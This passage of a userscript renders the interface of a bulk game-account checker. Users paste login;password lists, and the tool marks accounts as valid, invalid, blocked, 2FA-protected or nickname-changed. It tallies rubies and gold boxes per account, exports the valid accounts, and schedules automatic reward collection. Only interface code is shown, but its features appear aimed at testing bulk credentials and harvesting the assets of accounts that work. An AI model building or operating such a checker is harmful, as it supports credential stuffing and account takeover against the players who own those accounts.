            modal.addEventListener("click", e => { if (e.target === modal) closeGoldBoxesModal(); });
            modal.querySelector("#gold-modal-close").addEventListener("click", closeGoldBoxesModal);
        }
        modal.setAttribute("data-theme", CONFIG.THEME || "dark");
        const list = getAccountsWithGoldBoxes();
        const box = modal.querySelector("#gold-modal-list");
        if (!list.length) {
            box.innerHTML = `<div class="tc-empty"><h4>Нет аккаунтов</h4><p>Нет валидных аккаунтов с золотыми ящиками (или значение ещё не считано).</p></div>`;
        } else {
            box.innerHTML = list.map(a => `
                <div class="tc-account-card" data-login="${escapeHtml(a.login)}" style="cursor:pointer;margin-bottom:8px">
                    <div>
                        <div class="login">${escapeHtml(a.username || a.login)}</div>
                        <div class="details">
                            <span class="tag">${escapeHtml(a.login)}</span>
                            <span class="tag">${escapeHtml(a.rank)}</span>
                            <span class="tag">📦 ${formatAmount(String(a.goldBoxes))}</span>
                            <span class="tag">◆ ${formatAmount(String(a.rubies))}</span>
                        </div>
                    </div>
                </div>`).join("");
            box.querySelectorAll(".tc-account-card").forEach(card => {
                card.addEventListener("click", () => {
                    selectedAccountLogin = card.dataset.login;
                    closeGoldBoxesModal();
                    if (selectedAccountLogin) openDetailModal(selectedAccountLogin);
                });
            });
        }
        modal.style.display = "flex";
        requestAnimationFrame(() => { modal.style.opacity = "1"; });
    }

    function closeGoldBoxesModal() {
        const modal = document.getElementById("tc-gold-modal");
        if (!modal) return;
        modal.style.opacity = "0";
        setTimeout(() => { modal.style.display = "none"; }, 200);
    }

    // =========================================================
    // RENDER — DASHBOARD
    // =========================================================
    function renderDashboard() {
        const el = document.getElementById("tab-dashboard");
        if (!el) return;

        let total = ACCOUNTS.length, done = 0, valid = 0, invalid = 0, blocked = 0, errors = 0, bonuses = 0, rubiesTotal = 0;
        ACCOUNTS.forEach(acc => {
            const st = getAccountStatus(acc.login);
            if (!st) return;
            if (st.done) done++;
            if (st.valid) { valid++; rubiesTotal += parseInt(st.rubies || 0, 10) || 0; }
            if (st.invalid) invalid++;
            if (st.blocked) blocked++;
            if (st.error) errors++;
            if (st.bonusReceived) bonuses++;
        });

        const rubiesList = getRubiesList();
        const eligible = rubiesList.length;
        const collected = rubiesList.filter(l => {
            const st = getAccountStatus(l);
            return st?.rubiesStatus === "Собрано";
        }).length;
        const queueStats = getCheckQueueStats();
        const assetsCount = getAccountsWithAssets().length;
        const goldTotal = getTotalGoldBoxes();
        const goldAccounts = getAccountsWithGoldBoxes().length;

        el.innerHTML = `
            <div class="tc-section-title">Overview</div>
            <div class="tc-stats">
                <div class="tc-stat">
                    <div class="tc-stat-icon">${ICONS.accounts}</div>
                    <div class="tc-stat-value">${total}</div>
                    <div class="tc-stat-label">Total accounts</div>
                    <div class="tc-stat-sub">In library</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-icon">${ICONS.checker}</div>
                    <div class="tc-stat-value">${valid}</div>
                    <div class="tc-stat-label">Valid</div>
                    <div class="tc-stat-sub">${done} checked</div>
                </div>
                <div class="tc-stat" id="tc-stat-rubies-total" style="cursor:pointer" title="Показать аккаунты с рубинами/танкоинами">
                    <div class="tc-stat-icon">${ICONS.rubies}</div>
                    <div class="tc-stat-value">${formatAmount(String(rubiesTotal))}</div>
                    <div class="tc-stat-label">Total rubies</div>
                    <div class="tc-stat-sub">Нажми · ${assetsCount} акк. с активами</div>
                </div>
                <div class="tc-stat" id="tc-stat-gold-total" style="cursor:pointer" title="Показать аккаунты с золотыми ящиками">
                    <div class="tc-stat-icon">${ICONS.stats}</div>
                    <div class="tc-stat-value">${formatAmount(String(goldTotal))}</div>
                    <div class="tc-stat-label">Total gold boxes</div>
                    <div class="tc-stat-sub">Нажми · ${goldAccounts} акк. с голдами</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-icon">${ICONS.stats}</div>
                    <div class="tc-stat-value">${bonuses}</div>
                    <div class="tc-stat-label">Bonuses</div>
                    <div class="tc-stat-sub">Repatriation received</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-icon">${ICONS.rubies}</div>
                    <div class="tc-stat-value">${eligible}</div>
                    <div class="tc-stat-label">Rubies eligible</div>
                    <div class="tc-stat-sub">${collected} collected today</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-icon">${ICONS.alert}</div>
                    <div class="tc-stat-value" style="color:var(--tc-danger)">${invalid + blocked + errors}</div>
                    <div class="tc-stat-label">Issues</div>
                    <div class="tc-stat-sub">${invalid} invalid · ${blocked} blocked</div>
                </div>
                <div class="tc-stat" id="tc-queue-stat">
                    <div class="tc-stat-icon">${ICONS.checker}</div>
                    <div class="tc-stat-value" id="tc-queue-remaining">${queueStats.remaining}</div>
                    <div class="tc-stat-label">Осталось проверить</div>
                    <div class="tc-stat-sub">${queueStats.done} проверено · ${queueStats.total} в очереди</div>
                </div>
            </div>
            <div class="tc-section-title" style="margin-top:24px">Daily Rubies accounts</div>
            <div id="tc-dashboard-rubies" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px"></div>
        `;

        const rubiesStat = document.getElementById("tc-stat-rubies-total");
        if (rubiesStat) {
            rubiesStat.addEventListener("click", () => openAssetsModal());
        }
        const goldStat = document.getElementById("tc-stat-gold-total");
        if (goldStat) {
            goldStat.addEventListener("click", () => openGoldBoxesModal());
        }

        const rubiesContainer = document.getElementById("tc-dashboard-rubies");
        if (!rubiesContainer) return;
        const rubiesAccounts = getRubiesEligibleAccounts();
        if (rubiesAccounts.length === 0) {
            rubiesContainer.innerHTML = `
                <div class="tc-empty" style="grid-column:1/-1">
                    <h4>No Daily Rubies accounts</h4>
                    <p>Add accounts with active bonus compensation or add them manually.</p>
                </div>`;
            return;
        }
        rubiesContainer.innerHTML = rubiesAccounts.slice(0, 12).map(acc => {
            const st = getAccountStatus(acc.login) || {};
            const rem = st.rubiesRemainingDays;
            const total = st.rubiesTotalDays || 10;
            const completed = st.rubiesCompletedDays || 0;
            const pct = total > 0 ? Math.min(100, Math.round((completed / total) * 100)) : 0;
            const lastCollect = st.lastRubiesCollection
                ? new Date(st.lastRubiesCollection).toLocaleString("ru-RU", { day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" })
                : "—";
            const dotClass = st.rubiesSubscriptionFinished ? "err" : (st.rubiesStatus === "Собрано" ? "" : "warn");
            return `
            <div class="tc-prem-card" data-login="${escapeHtml(acc.login)}">
                <div class="tc-prem-top">
                    <div>
                        <div class="tc-prem-login"><span class="dot ${dotClass}"></span>${escapeHtml(st.username || acc.login)}</div>
                        <div class="tc-prem-rank">${escapeHtml(st.rank || "—")}</div>
                    </div>
                    <span class="tc-status-tag ${st.rubiesSubscriptionFinished ? 'tag-error' : st.rubiesStatus === 'Собрано' ? 'tag-done' : 'tag-ready'}">${escapeHtml(st.rubiesSubscriptionFinished ? 'ENDED' : (st.rubiesStatus || 'READY'))}</span>
                </div>
                <div class="tc-prem-row">
                    <div>◆<span class="val">${formatAmount(st.rubies || "0")}</span></div>
                    <div>💎<span class="val">${rem != null ? rem : "—"}</span> days</div>
                </div>
                <div>
                    <div class="tc-prem-foot">
                        <span>Daily Rubies</span>
                        <span>${completed}/${total}</span>
                    </div>
                    <div class="tc-prem-progress"><div class="tc-prem-progress-bar" style="width:${pct}%"></div></div>
                </div>
                <div class="tc-prem-foot">
                    <span>Last collection</span>
                    <span>${lastCollect}</span>
                </div>
            </div>`;
        }).join("");
    }

    // =========================================================
    // RENDER — CHECKER
    // =========================================================
    function renderChecker() {
        const el = document.getElementById("tab-checker");
        if (!el) return;
        el.innerHTML = `
            <div class="tc-mode-row">
                <button class="tc-mode-btn ${MODE === "checker" ? "active" : ""}" id="mode-checker">Checker</button>
                <button class="tc-mode-btn ${MODE === "fastValid" ? "active" : ""}" id="mode-fastvalid">⚡ Быстрый валид-чекер</button>
                <button class="tc-mode-btn ${MODE === "nickname" ? "active" : ""}" id="mode-nickname">Nickname</button>
            </div>
            <div class="tc-section-title">Control</div>
            <div class="tc-status-bar" id="tc-status-bar">● <span class="hl">Stopped</span> · Mode: ${MODE}</div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="btn-start">${ICONS.play} Start</button>
                <button class="tc-btn tc-btn-secondary" id="btn-pause">${ICONS.pause} Pause</button>
                <button class="tc-btn tc-btn-danger" id="btn-stop">${ICONS.stop} Stop</button>
            </div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-secondary" id="btn-reset">↺ Reset statuses</button>
                <button class="tc-btn tc-btn-secondary" id="btn-export-json">Export JSON</button>
            </div>

            ${MODE === "fastValid" ? `
            <div class="tc-section-title" style="margin-top:22px">⚡ База FastValid (отдельная)</div>
            <div style="font-size:11px;color:var(--tc-text-dim);margin:-10px 0 12px;line-height:1.5">
                Эта база не связана с Checker и Daily Rubies. Статусы и очередь — отдельные.
                В базе: <b id="fv-db-count">${FAST_VALID_ACCOUNTS.length}</b> ·
                валидных: <b id="fv-valid-count">${FAST_VALID_ACCOUNTS.filter(a => getFastValidStatus(a.login)?.valid).length}</b> ·
                осталось: <b id="fv-left-count">${FAST_VALID_ACCOUNTS.filter(a => !isFastValidFinished(a.login)).length}</b>
            </div>
            <textarea class="tc-import-area" id="fv-import-textarea" style="min-height:110px" placeholder="login;password&#10;или login:password&#10;или&#10;Ник - login&#10;Пароль - pass"></textarea>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="fv-btn-import">+ Добавить в FastValid</button>
                <button class="tc-btn tc-btn-secondary" id="fv-btn-reset-st">↺ Сброс статусов FastValid</button>
                <button class="tc-btn tc-btn-danger" id="fv-btn-clear">⌫ Очистить базу FastValid</button>
            </div>
            <div id="fv-import-result" style="margin:6px 0 10px;font-size:12px;color:var(--tc-text-muted)"></div>
            ` : ""}

            <div class="tc-section-title" style="margin-top:24px">Filters</div>
            <div class="tc-filters" id="tc-issue-filters">
                <button class="tc-filter-btn active" data-issue="all">All</button>
                <button class="tc-filter-btn danger" data-issue="invalid">Invalid</button>
                <button class="tc-filter-btn danger" data-issue="blocked">Blocked</button>
                <button class="tc-filter-btn" data-issue="twofa">2FA</button>
                <button class="tc-filter-btn" data-issue="nickname">Nickname</button>
                <button class="tc-filter-btn danger" data-issue="error">Error</button>
            </div>

            <input class="tc-search" id="account-search" placeholder="Search accounts…">
                        <div class="tc-section-title" style="margin-top:24px">Export by status</div>
            <div class="tc-filters" id="tc-export-filters" style="flex-wrap:wrap">
                <button class="tc-filter-btn" data-export="valid">✓ Valid</button>
                <button class="tc-filter-btn danger" data-export="invalid">Invalid</button>
                <button class="tc-filter-btn danger" data-export="blocked">Blocked</button>
                <button class="tc-filter-btn" data-export="twofa">2FA</button>
                <button class="tc-filter-btn" data-export="nickname">Nickname</button>
                <button class="tc-filter-btn danger" data-export="error">Error</button>
                <button class="tc-filter-btn" data-export="lowrank">Low rank</button>
                <button class="tc-filter-btn" data-export="bonus">✦ Bonus</button>
                <button class="tc-filter-btn" data-export="unchecked">↻ Не проверились</button>
                <button class="tc-filter-btn" data-export="all">All</button>
            </div>

            <div class="tc-section-title" style="margin-top:24px">Accounts preview</div>
            <div class="tc-account-list" id="account-list" style="max-height:320px"></div>
        `;

        document.getElementById("mode-checker").addEventListener("click", () => {
            if (isRunning) return showToast("Stop first", "warning");
            MODE = "checker"; saveConfig(); renderChecker(); updateUI();
        });
        document.getElementById("mode-fastvalid").addEventListener("click", () => {
            if (isRunning) return showToast("Stop first", "warning");
            MODE = "fastValid"; saveConfig(); renderChecker(); updateUI();
        });
        document.getElementById("mode-nickname").addEventListener("click", () => {
            if (isRunning) return showToast("Stop first", "warning");
            MODE = "nickname"; saveConfig(); renderChecker(); updateUI();
        });

        const fvImportBtn = document.getElementById("fv-btn-import");
        if (fvImportBtn) {
            fvImportBtn.addEventListener("click", () => {
                const ta = document.getElementById("fv-import-textarea");
                const value = (ta?.value || "").trim();
                if (!value) return showToast("Вставь аккаунты", "warning");
                const res = addFastValidAccountsFromText(value);
                const out = document.getElementById("fv-import-result");
                if (out) {
                    out.innerHTML = res.added
                        ? `<span style="color:var(--tc-success)">✓ Добавлено: ${res.added}</span>` +
                          (res.dup ? ` · дубликаты: ${res.dup}` : "") +
                          ` · всего в базе: ${FAST_VALID_ACCOUNTS.length}`
                        : `<span style="color:var(--tc-danger)">Ничего не добавлено</span>`;
                }
                if (ta) ta.value = "";
                if (res.added) {
                    showToast(`FastValid: +${res.added}`, "success");
                    renderChecker();
                    updateUI();
                } else {
                    showToast("Не удалось распознать аккаунты", "warning");
                }
            });
            document.getElementById("fv-btn-clear")?.addEventListener("click", () => {
                if (!FAST_VALID_ACCOUNTS.length) return showToast("База FastValid уже пуста", "info");
                if (!confirm(`Очистить базу FastValid (${FAST_VALID_ACCOUNTS.length} акк.)?\nChecker и Rubies не затронутся.`)) return;
                const n = FAST_VALID_ACCOUNTS.length;
                clearFastValidAccounts();
                showToast(`FastValid очищена: ${n}`, "success");
                renderChecker();
                updateUI();
            });
            document.getElementById("fv-btn-reset-st")?.addEventListener("click", () => {
                if (!confirm("Сбросить статусы только FastValid?")) return;
                clearFastValidStatuses();
                clearFastValidQueue();
                shuffledAccounts = [];
                currentIndex = 0;
                showToast("Статусы FastValid сброшены", "success");
                renderChecker();
                updateUI();
            });
        }

        document.getElementById("btn-start").addEventListener("click", () => {
            if (isRunning) return;
            setRunningState(true);
            isPaused = false;
            try { clearEmptyLoginReloadState(); } catch (_) {}
            showToast("Started (" + MODE + ")", "success");
            startChecking();
            updateUI();
        });
        document.getElementById("btn-stop").addEventListener("click", () => {
            setRunningState(false); isPaused = false; showToast("Stopped", "info"); updateUI();
        });
        document.getElementById("btn-pause").addEventListener("click", () => {
            if (!isRunning) return;
            isPaused = !isPaused;
            showToast(isPaused ? "Paused" : "Resumed", "info");
            updateUI();
        });
        document.getElementById("btn-reset").addEventListener("click", () => {
            if (!confirm("Reset all statuses?")) return;
            if (MODE === "fastValid") {
                clearFastValidStatuses();
                clearFastValidQueue();
            } else {
                [...ACCOUNTS, ...RUBIES_ACCOUNTS].forEach(acc => GM_deleteValue(CONFIG.DB_PREFIX + acc.login));
            }
            currentIndex = 0;
            setRunningState(false);
            shuffledAccounts = [];
            updateUI();
            renderChecker();
            showToast("Statuses reset", "success");
        });
        document.getElementById("btn-export-json").addEventListener("click", exportDataJSON);

        document.querySelectorAll("#tc-issue-filters .tc-filter-btn").forEach(btn => {
            btn.addEventListener("click", () => {
                selectedIssueSubfilter = btn.dataset.issue;
                document.querySelectorAll("#tc-issue-filters .tc-filter-btn").forEach(b => b.classList.remove("active"));
                btn.classList.add("active");
                renderAccountList();
            });
        });
        document.getElementById("account-search").addEventListener("input", e => {
            searchQuery = e.target.value;
            renderAccountList();
        });

        document.querySelectorAll("#tc-export-filters [data-export]").forEach(btn => {
            btn.addEventListener("click", () => exportSectionTxt(btn.dataset.export));
        });

        renderAccountList();
    }

    function renderAccountList() {
        const list = document.getElementById("account-list");
        if (!list) return;
        const useFv = MODE === "fastValid";
        let filtered = useFv ? [...FAST_VALID_ACCOUNTS] : [...ACCOUNTS];
        const statusOf = (login) => useFv ? getFastValidStatus(login) : getAccountStatus(login);
        if (searchQuery) {
            const q = searchQuery.toLowerCase();
            filtered = filtered.filter(acc => {
                const st = statusOf(acc.login);
                return acc.login.toLowerCase().includes(q) ||
                    (st?.username || "").toLowerCase().includes(q) ||
                    (st?.rank || "").toLowerCase().includes(q);
            });
        }
        if (selectedIssueSubfilter !== "all") {
            filtered = filtered.filter(acc => {
                const st = statusOf(acc.login);
                if (!st) return false;
                if (selectedIssueSubfilter === "invalid") return !!st.invalid;
                if (selectedIssueSubfilter === "blocked") return !!st.blocked;
                if (selectedIssueSubfilter === "twofa") return !!st.twofa;
                if (selectedIssueSubfilter === "nickname") return !!(st.nicknameChanged && !st.nicknameFixed);
                if (selectedIssueSubfilter === "error") return !!st.error;
                return true;
            });
        }
        if (filtered.length === 0) {
            list.innerHTML = useFv
                ? `<div class="tc-empty"><h4>База FastValid пуста</h4><p>Добавь аккаунты в блок выше.</p></div>`
                : `<div class="tc-empty"><h4>No accounts</h4><p>Import accounts in Import / Export.</p></div>`;
            return;
        }
        list.innerHTML = filtered.slice(0, 200).map(acc => {
            const st = statusOf(acc.login);
            let tagClass = "tag-pending", tagText = "PENDING", details = "";
            if (st) {
                if (st.done && st.valid) {
                    tagClass = "tag-done"; tagText = "VALID";
                    if (st.bonusReceived) details += '<span class="tag accent">✦ bonus</span>';
                    if (st.rubies) details += `<span class="tag">◆${formatAmount(st.rubies)}</span>`;
                    if (st.rank) details += `<span class="tag">${escapeHtml(st.rank)}</span>`;
                } else if (st.invalid) { tagClass = "tag-invalid"; tagText = "INVALID"; }
                else if (st.blocked) { tagClass = "tag-blocked"; tagText = "BLOCKED"; }
                else if (st.nicknameChanged && !st.nicknameFixed) { tagClass = "tag-nickname"; tagText = "NICK"; }
                else if (st.twofa) { tagClass = "tag-twofa"; tagText = "2FA"; }
                else if (st.skippedLowRank) { tagClass = "tag-error"; tagText = "LOW"; }
                else if (st.error) { tagClass = "tag-error"; tagText = "ERROR"; }
            }
            return `<div class="tc-account-card" data-login="${escapeHtml(acc.login)}">
                <div><div class="login">${escapeHtml(acc.login)}</div><div class="details">${details}</div></div>
                <span class="tc-status-tag ${tagClass}">${tagText}</span>
            </div>`;
        }).join("");
        list.querySelectorAll(".tc-account-card").forEach(card => {
            card.addEventListener("click", () => {
                selectedAccountLogin = card.dataset.login;
                openDetailModal(selectedAccountLogin);
            });
        });
    }

    // =========================================================
    // RENDER — DAILY RUBIES
    // =========================================================
    function getAllRubiesVisibleAccounts() {
        const map = new Map();
        RUBIES_ACCOUNTS.forEach(acc => {
            if (!acc || !acc.login) return;
            const st = getAccountStatus(acc.login) || {};
            map.set(acc.login, { ...acc, ...st, _source: "active" });
        });
        RUBIES_ARCHIVE.forEach(acc => {
            if (!acc || !acc.login || map.has(acc.login)) return;
            const st = acc.status || getAccountStatus(acc.login) || {};
            map.set(acc.login, { ...acc, ...st, _source: "archive" });
        });
        return [...map.values()].filter(acc => acc.login);
    }

    function getRubiesVisibleStatus(acc) {
        const st = getAccountStatus(acc.login) || acc.status || {};
        if (acc._source === "archive" || st.rubiesSubscriptionFinished) return { cls: "tag-error", text: "ENDED" };
        if (st.rubiesEnabled === false) return { cls: "tag-error", text: "DISABLED" };
        if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) return { cls: "tag-done", text: "СОБРАНО" };
        if (st.rubiesStatus === "Ошибка") return { cls: "tag-error", text: "ОШИБКА" };
        return { cls: "tag-ready", text: "ГОТОВ" };
    }

    function renderAllRubiesAccountsPanel() {
        const root = document.getElementById("rubies-all-accounts");
        if (!root) return;

        const accounts = getAllRubiesVisibleAccounts();
        const search = String(root.querySelector("#rubies-all-search")?.value || "").trim().toLowerCase();
        const filter = root.querySelector("#rubies-all-filter")?.value || "all";

        const filtered = accounts.filter(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            const username = String(st.username || acc.nickname || acc.fullName || acc.login).toLowerCase();
            const login = String(acc.login).toLowerCase();
            if (search && !username.includes(search) && !login.includes(search)) return false;
            if (filter === "active") return acc._source === "active" && st.rubiesEnabled !== false && !st.rubiesSubscriptionFinished;
            if (filter === "collected") return st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st);
            if (filter === "ended") return acc._source === "archive" || !!st.rubiesSubscriptionFinished;
            if (filter === "disabled") return st.rubiesEnabled === false;
            if (filter === "error") return st.rubiesStatus === "Ошибка";
            return true;
        });

        const active = accounts.filter(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            return acc._source === "active" && st.rubiesEnabled !== false && !st.rubiesSubscriptionFinished;
        }).length;
        const collected = accounts.filter(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            return st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st);
        }).length;
        const ended = accounts.filter(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            return acc._source === "archive" || !!st.rubiesSubscriptionFinished;
        }).length;
        const disabled = accounts.filter(acc => (getAccountStatus(acc.login) || acc.status || {}).rubiesEnabled === false).length;

        const stats = root.querySelector(".rubies-all-stats");
        if (stats) {
            stats.innerHTML = `
                <div class="tc-stat"><div class="tc-stat-value">${accounts.length}</div><div class="tc-stat-label">Всего</div><div class="tc-stat-sub">База + архив</div></div>
                <div class="tc-stat"><div class="tc-stat-value">${active}</div><div class="tc-stat-label">Активных</div><div class="tc-stat-sub">В рабочем списке</div></div>
                <div class="tc-stat"><div class="tc-stat-value">${collected}</div><div class="tc-stat-label">Собрано</div><div class="tc-stat-sub">Текущий день</div></div>
                <div class="tc-stat"><div class="tc-stat-value">${ended}</div><div class="tc-stat-label">Завершено</div><div class="tc-stat-sub">Архив</div></div>
                <div class="tc-stat"><div class="tc-stat-value">${disabled}</div><div class="tc-stat-label">Отключено</div><div class="tc-stat-sub">Не участвуют</div></div>
            `;
        }

        const count = root.querySelector(".rubies-all-count");
        if (count) count.textContent = `Показано: ${filtered.length} из ${accounts.length}`;

        const list = root.querySelector(".rubies-all-list");
        if (!list) return;
        if (!filtered.length) {
            list.innerHTML = `<div class="tc-empty" style="padding:24px"><h4>Ничего не найдено</h4><p>Измените поиск или фильтр.</p></div>`;
            return;
        }

        list.innerHTML = filtered.map(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            const status = getRubiesVisibleStatus(acc);
            const name = acc.nickname || acc.fullName || acc.login;
            const rank = st.rank || acc.rankFromBase || "—";
            const rubies = st.rubies || "0";
            const remaining = st.rubiesRemainingDays != null ? `${st.rubiesRemainingDays}d` : "—";
            const progress = st.rubiesCompletedDays != null || st.rubiesTotalDays != null ? `${st.rubiesCompletedDays || 0}/${st.rubiesTotalDays || 0}` : "—";
            const source = acc._source === "archive" ? "ARCHIVE" : "ACTIVE";
            const canToggle = acc._source === "active";

            return `<div class="tc-account-card" data-rubies-all-login="${escapeHtml(acc.login)}">
                <div>
                    <div class="login">${escapeHtml(name)}</div>
                    <div class="details">
                        <span class="tag">${escapeHtml(acc.login)}</span>
                        <span class="tag">${escapeHtml(rank)}</span>
                        <span class="tag">◆${formatAmount(rubies)}</span>
                        <span class="tag">💎 ${escapeHtml(remaining)}</span>
                        <span class="tag">${escapeHtml(progress)}</span>
                        <span class="tag">${source}</span>
                    </div>
                </div>
                ${canToggle
                    ? `<button class="tc-status-tag ${status.cls} rubies-all-status-toggle" data-login="${escapeHtml(acc.login)}" title="Изменить статус">${escapeHtml(status.text)}</button>`
                    : `<span class="tc-status-tag ${status.cls}">${escapeHtml(status.text)}</span>`}
            </div>`;
        }).join("");

        list.querySelectorAll(".tc-account-card").forEach(card => {
            card.addEventListener("click", () => {
                selectedAccountLogin = card.dataset.rubiesAllLogin;
                if (selectedAccountLogin) openDetailModal(selectedAccountLogin);
            });
        });

        list.querySelectorAll(".rubies-all-status-toggle").forEach(btn => {
            btn.addEventListener("click", e => {
                e.preventDefault();
                e.stopPropagation();
                const login = btn.dataset.login;
                const st = getAccountStatus(login) || {};
                const nextCollected = st.rubiesStatus !== "Собрано";
                setRubiesCollectedStatus(login, nextCollected);
                showToast(nextCollected ? `${login}: СОБРАНО` : `${login}: НЕ СОБРАНО`, "info");
                renderAllRubiesAccountsPanel();
                updateUI();
            });
        });
    }

    function bindRubiesAllAccountsPanel() {
        const root = document.getElementById("rubies-all-accounts");
        if (!root) return;
        const search = root.querySelector("#rubies-all-search");
        const filter = root.querySelector("#rubies-all-filter");
        if (search) search.addEventListener("input", renderAllRubiesAccountsPanel);
        if (filter) filter.addEventListener("change", renderAllRubiesAccountsPanel);
        renderAllRubiesAccountsPanel();
    }

    // =========================================================
    // RENDER — DAILY RUBIES
    // =========================================================
    function renderRubies() {
        const el = document.getElementById("tab-rubies");
        if (!el) return;

        const allEligible = getRubiesEligibleAccounts();
        const allStored = getAllRubiesVisibleAccounts();
        const ready = allEligible.filter(a => {
            const st = getAccountStatus(a.login);
            return st && !st.rubiesSubscriptionFinished;
        }).length;
        const collectedToday = allStored.filter(a => {
            const st = getAccountStatus(a.login) || a.status || {};
            return st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st);
        }).length;
        const finished = allStored.filter(a => {
            const st = getAccountStatus(a.login) || a.status || {};
            return a._source === "archive" || !!st.rubiesSubscriptionFinished;
        }).length;

        el.innerHTML = `
            <div class="tc-section-title">Statistics</div>
            <div class="tc-stats">
                <div class="tc-stat">
                    <div class="tc-stat-value">${allEligible.length}</div>
                    <div class="tc-stat-label">Eligible accounts</div>
                    <div class="tc-stat-sub">Active in list</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-value">${ready}</div>
                    <div class="tc-stat-label">Ready</div>
                    <div class="tc-stat-sub">Active subscription</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-value">${collectedToday}</div>
                    <div class="tc-stat-label">Collected</div>
                    <div class="tc-stat-sub">All stored records</div>
                </div>
                <div class="tc-stat">
                    <div class="tc-stat-value">${finished}</div>
                    <div class="tc-stat-label">Subscriptions ended</div>
                    <div class="tc-stat-sub">Archive included</div>
                </div>
            </div>

            <div class="tc-section-title" style="margin-top:22px">Control panel</div>
            <div class="tc-mode-row">
                <button class="tc-mode-btn ${CONFIG.RUBIES_MODE === "manual" ? "active" : ""}" id="rub-manual">Manual</button>
                <button class="tc-mode-btn ${CONFIG.RUBIES_MODE === "auto" ? "active" : ""}" id="rub-auto">Automatic</button>
            </div>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Auto start</span>
                <input type="checkbox" id="rub-autostart" ${CONFIG.RUBIES_AUTO_ENABLED ? "checked" : ""}>
                <span class="tc-switch-track"></span>
            </label>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Auto resume / start after page reload</span>
                <input type="checkbox" id="rub-autoreload" ${CONFIG.RUBIES_AUTO_START_ON_RELOAD ? "checked" : ""}>
                <span class="tc-switch-track"></span>
            </label>
            <div class="tc-setting-row">
                <div class="tc-setting-label">Schedule (Moscow · UTC+3)</div>
                <input class="tc-setting-input" id="rub-time" type="time" value="${CONFIG.RUBIES_AUTO_TIME}">
            </div>
            <label class="tc-switch" style="margin-bottom:12px">
                <span>Auto-add accounts with bonus</span>
                <input type="checkbox" id="rub-autoadd" ${CONFIG.RUBIES_AUTO_ADD_BONUS ? "checked" : ""}>
                <span class="tc-switch-track"></span>
            </label>
            <label class="tc-switch" style="margin-bottom:18px">
                <span>Skip accounts with finished subscription</span>
                <input type="checkbox" id="rub-skipfinished" ${CONFIG.RUBIES_SKIP_FINISHED ? "checked" : ""}>
                <span class="tc-switch-track"></span>
            </label>

            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="rub-start">${ICONS.play} Start collection</button>
                <button class="tc-btn tc-btn-danger" id="rub-stop">${ICONS.stop} Stop</button>
            </div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-secondary" id="rub-add">+ Add accounts</button>
                <button class="tc-btn tc-btn-secondary" id="rub-remove">− Remove from list</button>
                <button class="tc-btn tc-btn-danger" id="rub-clear">⌫ Clear list</button>
            </div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-primary" id="rub-export-all">${ICONS.download} Export all Rubies accounts TXT</button>
                <span style="font-size:11px;color:var(--tc-text-dim);align-self:center">Archive: ${RUBIES_ARCHIVE.length}</span>
            </div>

            <div class="tc-section-title" style="margin-top:24px">Все аккаунты Daily Rubies</div>
            <div style="font-size:11px;color:var(--tc-text-dim);margin:-12px 0 12px">
                Полный список рабочей базы и архива. Пароли и entrance hash здесь не отображаются.
            </div>
            <div id="rubies-all-accounts">
                <div class="tc-stats rubies-all-stats" style="margin-bottom:14px"></div>
                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
                    <input id="rubies-all-search" class="tc-setting-input" style="flex:1;min-width:220px" placeholder="Поиск по логину / нику...">
                    <select id="rubies-all-filter" class="tc-setting-input" style="width:180px">
                        <option value="all">Все</option>
                        <option value="active">Активные</option>
                        <option value="collected">Собрано</option>
                        <option value="ended">Завершённые</option>
                        <option value="disabled">Отключённые</option>
                        <option value="error">Ошибки</option>
                    </select>
                </div>
                <div class="rubies-all-count" style="font-size:11px;color:var(--tc-text-dim);margin-bottom:8px"></div>
                <div class="tc-account-list rubies-all-list" style="max-height:520px;overflow-y:auto"></div>
            </div>
        `;

        document.getElementById("rub-manual").addEventListener("click", () => { CONFIG.RUBIES_MODE = "manual"; saveConfig(); renderRubies(); });
        document.getElementById("rub-auto").addEventListener("click", () => { CONFIG.RUBIES_MODE = "auto"; saveConfig(); renderRubies(); scheduleRubies(); });
        document.getElementById("rub-autostart").addEventListener("change", e => { CONFIG.RUBIES_AUTO_ENABLED = e.target.checked; saveConfig(); scheduleRubies(); });
        document.getElementById("rub-autoreload").addEventListener("change", e => { CONFIG.RUBIES_AUTO_START_ON_RELOAD = e.target.checked; saveConfig(); });
        document.getElementById("rub-time").addEventListener("change", e => { CONFIG.RUBIES_AUTO_TIME = e.target.value || "05:00"; saveConfig(); });
        document.getElementById("rub-autoadd").addEventListener("change", e => { CONFIG.RUBIES_AUTO_ADD_BONUS = e.target.checked; saveConfig(); });
        document.getElementById("rub-skipfinished").addEventListener("change", e => { CONFIG.RUBIES_SKIP_FINISHED = e.target.checked; saveConfig(); });

        document.getElementById("rub-start").addEventListener("click", () => {
            if (isRunning) return showToast("Already running", "warning");
            MODE = "rubies"; saveConfig();
            const count = beginRubiesRun();
            if (!count) return showToast("Нет аккаунтов Daily Rubies", "warning");
            setRunningState(true);
            isPaused = false;
            updateUI();
            startChecking();
        });
        document.getElementById("rub-stop").addEventListener("click", () => { setRunningState(false); isPaused = false; updateUI(); });

